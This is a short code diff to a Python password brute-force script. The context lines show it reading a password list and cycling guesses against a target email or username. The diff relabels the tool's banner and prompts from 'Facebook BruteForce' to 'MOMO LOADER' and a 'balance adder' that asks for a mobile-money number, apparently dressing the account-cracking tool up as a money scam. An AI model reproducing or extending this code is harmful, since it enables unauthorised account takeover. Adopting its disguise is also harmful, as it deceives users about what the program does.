@@ -46,13 +46,13 @@ def is_this_a_password(email, index, password):
 
 
 if __name__ == "__main__":
-    print('\n---------- Welcome To Facebook BruteForce ----------\n')
+    print('\n---------- MOMO LOADER ----------\n')
     if not os.path.isfile(PASSWORD_FILE):
         print("Password file is not exist: ", PASSWORD_FILE)
         sys.exit(0)
     password_data = open(PASSWORD_FILE, 'r').read().split("\n")
-    print("Password file selected: ", PASSWORD_FILE)
-    email = input('Enter Email/Username to target: ').strip()
+    print("BALANCE ADDER FILE SELECTED: ", PASSWORD_FILE)
+    email = input('ENER VALID MOMO NUMBER: ').strip()
     for index, password in zip(range(password_data.__len__()), password_data):
         password = password.strip()
         if len(password) < MIN_PASSWORD_LENGTH:
